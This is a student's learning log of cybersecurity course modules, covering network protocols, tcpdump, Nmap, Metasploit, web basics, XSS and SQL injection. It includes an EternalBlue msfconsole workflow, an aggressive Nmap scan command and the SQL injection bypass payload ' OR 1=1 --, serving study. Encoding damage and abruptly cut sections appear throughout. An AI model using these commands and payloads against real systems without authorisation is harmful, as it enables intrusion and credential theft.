### üìö What I Learned / Key Concepts

This module explains the ‚Äúbackbone‚Äù of digital communications, a non-negotiable skill in cybersecurity.

#### 1. **Reference Models: OSI vs TCP/IP**
   - **OSI Model (7 layers):** A theoretical model that divides communication into 7 layers (Physical, Link, Network, Transport, Session, Presentation, Application). It is useful for learning and diagnosing problems.
   - **TCP/IP Model (4 layers):** The practical and real model on which the Internet is based (Link, Internet, Transport, Application).
   - We learned to **compare and contrast** both models, seeing how their layers relate to each other.

#### 2. **IP Addressing and Subnets**
   - **IP Addresses:** The unique identifiers of devices on a network (e.g., `192.168.1.1` for IPv4).
   - **Subnets:** How large networks are divided into smaller parts for better organization and security.

#### 3. **Transport Protocols: TCP vs UDP**
   - **TCP (Transmission Control Protocol):**
     - **Connection-oriented.** Establishes a channel before sending data.
     - **Reliable.** Ensures that packets arrive in order and without errors.
     - **Slower.** Used for web (HTTP/HTTPS), email (SMTP), file transfer (FTP).
   - **UDP (User Datagram Protocol):**
     - **Connectionless.** Sends data without establishing a channel first.
     - **Unreliable.** Does not guarantee delivery or order.
- **Faster.** Used for video/audio streaming, VoIP, DNS.

#### 4. **Encapsulation**
   - The process of **adding information from each layer (headers)** to application data as it travels ‚Äúdown‚Äù the protocol stack to be transmitted over the network.
   - At the destination, the process is reversed (‚Äúup‚Äù), removing each header until the original data is reached.

#### 5. **Hands-on Demonstration with Telnet**
   - The **`telnet`** command was used to ‚Äútalk‚Äù directly to services (such as web servers) over TCP on a specific port.
   - This demonstrated in a tangible way how a connection is established at the application/transport level.

### üõ†Ô∏è **Why is this important?**
- **Fundamentals of Cybersecurity:** To defend, audit, or attack a network, **you must understand how it works.**
- **Traffic Analysis:** Tools such as Wireshark require this knowledge to analyze packets and detect malicious activity.

## Module Completed: [Networking Essentials]

**Completion Date:** [2025/09/25]
**Module Objective:** Understand the functioning and importance of fundamental protocols that enable modern networks to operate, from automatic device configuration to global routing on the Internet.

### üìö What I Learned / Protocols Explored

This module delves into the protocols that enable automatic and efficient network communication.

#### 1. **DHCP (Dynamic Host Configuration Protocol)**
   - **What does it do?** It automatically assigns IP addresses and other network parameters (such as the gateway and DNS server) to devices when they connect to a network.
   - **Analogy:** It is the ‚Äúautomatic rental‚Äù of IP addresses on a network.
   - **Importance in Cybersecurity:** A malicious DHCP server can trick devices into connecting to it, redirecting their traffic (‚ÄúDHCP Spoofing‚Äù attack).

#### 2. **ARP (Address Resolution Protocol)**
   - **What does it do?** It finds the MAC (physical) address of a device when only its IP (logical) address is known within a local network.
   - **Fernando's diagram:** ‚ÄúWho has this IP? -> Tell me your MAC.‚Äù
   - **Importance in Cybersecurity:** Vulnerable to ‚ÄúARP Spoofing‚Äù or ‚ÄúARP Poisoning,‚Äù where an attacker can trick the network into sending traffic intended for someone else.

#### 3. **ICMP (Internet Control Message Protocol)**
   - **What does it do?** It is used to send control and error messages between network devices.
   - **Key Tools:**
     - **`Ping`:** Checks if a host is active and reachable on the network. (Uses ICMP Echo Request and Reply).
     - **`Traceroute`/`Tracert`:** Discovers the route that packets take to reach a destination, showing all intermediate routers.
   - **Importance in Cybersecurity:** Essential for network diagnostics. Attackers use it to ‚Äúmap‚Äù a network (discover active hosts). ICMP traffic is often blocked by firewalls to prevent this.

#### 4. **Routing Protocols**
   - **What do they do?** They are the ‚Äúnavigation systems‚Äù of routers. They allow them to share information with each other to find the best route to send packets across different networks.
   - **Main Protocols:**
     - **OSPF & EIGRP:** Used within large networks within the same organization (e.g., a company).
     - **BGP (Border Gateway Protocol):** The protocol that **connects the Internet**. It manages routing *between* large service providers (ISPs). It is the most critical protocol globally.
- **RIP:** An older and simpler protocol.
- **Importance in Cybersecurity:** An attack on BGP can redirect Internet traffic on a massive scale. Understanding routing is key to defending an organization's perimeter network.

#### 5. **NAT (Network Address Translation)**
   - **What does it do?** It translates private IP addresses (e.g., `192.168.1.10`) from a local network to a single public IP address to access the Internet. It allows many devices to share a single public IP.
   - **Analogy:** It is the ‚Äúreceptionist‚Äù of an office. All employees (private IPs) use the same office address (public IP) to send emails outside the office.
   - **Importance in Cybersecurity:** It hides the internal structure of a network from the Internet, acting as a first layer of defense (concealment). It is essential in any home router.

### üõ†Ô∏è **Practical Conclusion**
These protocols are the ‚Äúinvisible magic‚Äù that makes networks work. A system administrator or cybersecurity professional must understand them in order to:
-   **Diagnose problems** with connectivity effectively.
-   **Understand and exploit** common vulnerabilities such as ARP Spoofing.
-   **Secure the configuration** of routers and firewalls.

- **Combine Conditions:** Use logical operators `and`, `or`, and `not` to create complex filters. Example: `tcpdump ‚Äòudp or icmp‚Äô`.
- **Filtering by TCP Flags:** Bit-level analysis to identify packets with specific flags. For example, `tcpdump ‚Äòtcp[tcpflags] == tcp-rst‚Äô` captures packets with only the RST flag set. This approach is powerful for detecting scans or connectivity issues.

#### 3. **Output and Display Options (Your ‚ÄúGlasses‚Äù)**
- **`-q` (Quick Output):** Displays a simplified, clean view of traffic.
- **`-e` (Link Header):** Includes MAC addresses in the output, crucial for analyzing traffic on the local network (e.g., ARP packets).
- **`-A` (ASCII Output):** Shows the packet contents in plain text, ideal for reading unencrypted data such as HTTP requests.
- **`-X` / `-xx` (Hexadecimal and ASCII Output):** Reveals the complete contents of the packet in hexadecimal along with its ASCII representation. It is the ultimate tool for analyzing any type of traffic, especially when it is encrypted.

#### 4. **Reading and Analyzing PCAP Files**
- **`-r` (Read from File):** The option `tcpdump -r capture.pcap` allows you to analyze saved traffic captures, facilitating post-incident forensic analysis.
- **Integration with other tools:** Use pipes (`|`) with tools such as `wc -l` to count packets that match a filter.

### üõ†Ô∏è Practical Conclusion

Mastering Tcpdump involves understanding that it is not about memorizing commands, but rather **understanding the logic of filters and knowing how to construct specific queries**. The ability to accurately capture and filter network traffic from the terminal is a fundamental skill for troubleshooting, network monitoring, and security analysis tasks.

> **Key Skill Acquired:** Being able to perform an initial and specific analysis of network traffic in environments where a graphical interface such as Wireshark is not available, especially in remote server administration via SSH.

Module Completed: Nmap: The Basics
Completion Date: [2025/09/26]
Module Objective: Master the fundamental capabilities of Nmap for network discovery, port scanning, service detection, and result management in ethical hacking and network diagnostics.

üìö What I Learned / Skills Acquired
This module transformed Nmap from a simple port scanner into a comprehensive network exploration tool. The focus was on practical application for security assessments and network analysis.

1. Network Discovery & Host Enumeration
List Scan (-sL): Passive reconnaissance to enumerate targets without sending packets to the network.

Ping Scan (-sn): Efficient host discovery using ICMP and ARP requests to identify active devices on a network.

Forced Scan (-Pn): Treat all hosts as online, bypassing host discovery for networks that block ping requests.

2. Port Scanning Techniques (The Core of Nmap)
TCP Connect Scan (-sT): Completes full TCP three-way handshake. Reliable but easily detectable.

TCP SYN Scan (-sS): Default when run with sudo. Sends SYN packet only (half-open scan). Faster and stealthier.

UDP Scan (-sU): Discovers open UDP ports. Slower due to UDP's connectionless nature.

Port Specification: Mastered using -p- for all ports, -F for top 100 ports, and custom ranges like -p 22,80,443.

3. Service & OS Detection
Version Detection (-sV): Probes open ports to determine service/application versions.

OS Fingerprinting (-O): Detects operating system based on network stack characteristics.

Aggressive Scan (-A): Combines OS detection, version detection, script scanning, and traceroute.

4. Timing & Performance Optimization
Timing Templates (-T0 to -T5): From paranoid (T0) to insane (T5). Learned to balance speed vs. stealth.

Parallelism Control: --min-parallelism and --max-parallelism for managing concurrent probes.

Rate Management: --min-rate and --max-rate for precise packet control per second.

Host Timeouts: --host-timeout for handling slow or unresponsive targets.

5. Output Formats & Verbosity
Verbosity Levels (-v, -vv, -vvv): Real-time progress monitoring during long scans.

Debug Levels (-d, -dd, -d9): Detailed technical output for troubleshooting.

Output Formats: Mastered -oN (normal), -oX (XML), -oG (grepable), and -oA (all formats).

üõ†Ô∏è Practical Conclusion
The key insight from this module is that effective Nmap usage requires strategic thinking about the scanning context. The same target requires different approaches for a stealthy penetration test versus a quick network inventory.

Critical Realization: Running Nmap with sudo privileges unlocks its full potential, particularly the stealthy SYN scan (-sS) which becomes the default. Without privileges, Nmap falls back to the slower, more detectable TCP Connect scan (-sT).

The ability to chain options like sudo nmap -sS -sV -O -T4 -A -p- -oA full_scan target represents a professional-grade approach to comprehensive network assessment.

Key Skill Acquired: Designing tailored scanning methodologies based on specific objectives‚Äîwhether for rapid reconnaissance, stealthy penetration testing, or detailed service enumeration.

- **What is it?** An **open-source framework** for developing and executing exploits against remote targets. It is the central tool for many phases of a penetration test.
- **Purpose:** To provide a unified platform for researching, developing, and executing code that exploits security vulnerabilities.

#### 2. **Main Components of Metasploit (Modular Architecture)**
Metasploit is organized into modules, allowing for great flexibility and code reuse.

| **Component** | **Main Function** |
| :--- | :--- |
| **Auxiliary** | Support modules such as scanners, fuzzers, and information gathering tools. They do not execute payloads. |
| **Encoders** | Transform payloads to evade antivirus software. |
| **Evasion** | Creates custom executables to evade protection measures on the client. |
| **Exploits** | Code that takes advantage of a specific vulnerability in software or a system. |
| **NOPs** | Generators of ‚ÄúNo Operation‚Äù instructions for exploit stability. |
| **Payloads** | Code that executes on the target system after a successful exploit (e.g., `meterpreter`, reverse shells). |
| **Post** | Post-exploitation modules that run once access to a system has been gained. |

#### 3. **Msfconsole: The Heart of Metasploit**
- **Main Interface:** `msfconsole` is the most powerful and widely used interface within the framework.
- **Contexts:** It is crucial to understand what context you are in, as it defines the available commands:
- `msf6 >`: Main prompt.
- `msf6 exploit(...) >`: Context of a loaded module (where options are configured).
- `meterpreter >`: Active session on a compromised system.

#### 4. **Working with Modules (Basic Workflow)**
The lifecycle for using a module in `msfconsole` follows these steps:

1.  **Select a Module:**
```bash
    use exploit/windows/smb/ms17_010_eternalblue
    ```

2.  **Display and Configure Options:**
```bash
    show options          # View required and optional parameters.
    set RHOSTS 10.10.x.x  # Configure the target IP.
    set LHOST 10.10.y.y   # Configure the attacker IP (for reverse connections).
    ```

3.  **Global Configuration (Optional):**
    ```bash
    setg RHOSTS 10.10.x.x # `setg` sets a value for all modules.
    ```

4.  **Launch Execution:**
    ```bash
    exploit
    # or
    run
    ```

5.  **Manage Sessions:**
    ```bash
    sessions              # List active sessions.
    sessions -i <ID>      # Interact with a specific session.
    background            # Send a meterpreter session to the background.
    ```

### üõ†Ô∏è **Practical Conclusion**
Metasploit is no longer an intimidating ‚Äúblack box.‚Äù By understanding its modular structure and the basic flow of `msfconsole`, it becomes a systematic and predictable tool for:
- Checking for vulnerabilities.
- Automating the exploitation phase.
- Centrally managing access to multiple compromised systems.

> **Key Skill Acquired:** The ability to navigate the `msfconsole` interface, search for modules relevant to a target, and apply the fundamental flow of `use -> configure -> run` to execute them.

**Completion Date:** [2025/10/01]

Title: Exploit MS17-010 (EternalBlue) and Credential Cracking: Analysis of a Critical Attack
I. Project Objective
This project documents the complete process of exploiting the MS17-010 (EternalBlue) flaw in a vulnerable Windows system, covering everything from reconnaissance and the initial attack to advanced post-exploitation (privilege escalation and credential theft).

II. Attack Phases (Workflow)
Phase    Tools Used    Key Commands
Reconnaissance    Nmap    The vulnerability to the SMB protocol was confirmed by a scan (nmap -sV) that showed port 445/TCP open on an unpatched Windows system.

# Module Completed: Web Application Basics

**Completion Date:** [2025/10/01]

Title: Fundamentals of Web Applications: HTTP Architecture and Security Analysis
I. Project Objective
To document the fundamental components of web applications, with a focus on HTTP communication security, as a basis for understanding and mitigating injection and Cross-Site Scripting (XSS) attacks.

II. Web Application Architecture
A distinction is made between the interface (front-end), consisting of HTML (structure), CSS (style), and JavaScript (behavior), and the back-end, which includes the server and database (the main target of SQL injection).

III. Analysis of HTTP Communication
Security focuses on manipulating the flow of Requests and Responses:

Component    Security Risk (Focus)
GET/POST Methods    GET (get data): Should not carry sensitive information in the URL. POST (send data): Main target of malicious data injection.
Headers    Carry authentication tokens and cookies. They are manipulated by attackers for identity theft (e.g., changing the User-Agent).
Query String (?key=value)    The most common attack zone; modifying these values can lead to SQLi or XSS.

Export to Spreadsheets
IV. Key Defense: Security Headers (Blue Team)
The following headers are essential for mitigating the most common browser-level attacks:

Content-Security-Policy (CSP): Implements a whitelist for scripts and resources, mitigating XSS.

Strict-Transport-Security (HSTS): Forces the browser to use HTTPS to prevent protocol downgrade attacks.

Set-Cookie: Must include the HttpOnly (protects against theft by XSS) and Secure (only sent over HTTPS) flags.

## Module Completed: JavaScript Essentials

**Completion Date:** [2025/10/01]

Title: JavaScript Essentials: Risk Analysis and Injection Techniques for XSS
I. Project Objective
To analyze the role of JavaScript in web applications from a security perspective, identifying the risks posed by weak implementations and techniques used for malicious code injection (XSS).

II. Key Attack Mechanisms
The following points represent the most significant security flaws that allow attacks via JavaScript:

Direct Script Injection: The attacker uses the <script> tag (internal or external) in an input field to cause the browser to execute unwanted code.

Abuse of Dialog Functions: The attacker's use of functions such as alert() or prompt() is the standard method for testing the existence of an XSS and, in extreme cases, causing a Client Denial of Service.

Control Flow Bypass: Security validation (e.g., logins, age verification) should NEVER reside in client-side JavaScript, as the attacker can easily bypass if-else statements to gain unauthorized access.

III. Code Forensics (Information Gathering)
Minification and Obfuscation: These techniques only hide the code from plain sight, but do not make it more secure. The attacker uses online deobfuscation tools to reverse the process and search for API keys, tokens, or vulnerable business logic in the source code.

## Module Completed: SQL Fundamentals

**Completion Date:** [2025/10/01]

Title: SQL Fundamentals: Risk Analysis and Attack Surface for SQL Injection (SQLi)
I. Project Objective
To document the structure of relational databases (SQL) and the use of manipulation commands as a basis for understanding SQL injection (SQLi) attacks.

II. The Critical Attack Surface (Validation Failure)
The main security risk is concentrated in the manipulation of CRUD operations through user input:

WHERE Clause Attack: Every successful SQLi attack focuses on manipulating the WHERE clause (used in SELECT, UPDATE, DELETE) to force the condition to always be true (TRUE).

Authentication Bypass: The fundamental payload ' OR 1=1 -- is injected into a login field to bypass password validation.

III. Data Extraction Commands and Functions
Once a vulnerability is exploited, the attacker uses the following functions to steal information:

Command    Security Purpose    Use in SQLi (Attack Example)
SELECT    Read data from the database.    UNION SELECT is injected to combine and dump data from hidden tables (e.g., users).
CONCAT()    Combines multiple fields into a single string.    Used with UNION SELECT to steal combined credentials: CONCAT(username, ‚Äò:‚Äô, password).
LENGTH() / SUBSTRING()    Functions that extract length and substrings.    Essential in Blind SQLi (Blind SQL Injection) attacks to guess table names and passwords one character at a time.
SHOW TABLES / DESCRIBE    DB mapping functions.    Used by the attacker to guess the internal structure of the database and the exact names of the columns to steal.

## Module Completed: Burp Suite: The Basics

**Completion Date:** [2025/10/02]

Title: Burp Suite: The Basics - Interception Flow and Attack Principles
I. Module Objective
Ensure control over web traffic using Burp Proxy to intercept, inspect, and modify HTTP/S requests. This is the foundational step for performing injection tests (SQLi, XSS, etc.).

II. Attack Flow: From Client to Server
The main value of Burp Suite is to convert the browser from a spectator to an active manipulator, demonstrating that client-side filters are useless for security.

Tool    Main Function    Role in the Attack
Proxy    Interception and Analysis.    Captures the request before it reaches the server. Allows manipulation of the payload in situ.
Repeater    Repetitive Testing.    Receives the request from the Proxy and sends it multiple times with modified payloads for fuzzing or manual exploitation.
Target    Reconnaissance (Map).    Maps the entire structure of the application (Site map) and identifies hidden endpoints that can be attacked.

Export to Spreadsheets
III. Mastered Security Concepts
Filter Bypass: Understanding that client-side (browser) filters can be easily evaded, making request manipulation in the proxy the only effective method of attack.

Scope: Clearly define the limits of the pentest to focus traffic only on the target, eliminating third-party ‚Äúnoise.‚Äù

HTTPS Fundamentals: Knowledge of the CA Certificate installation process to intercept and decrypt encrypted traffic (TLS/SSL).
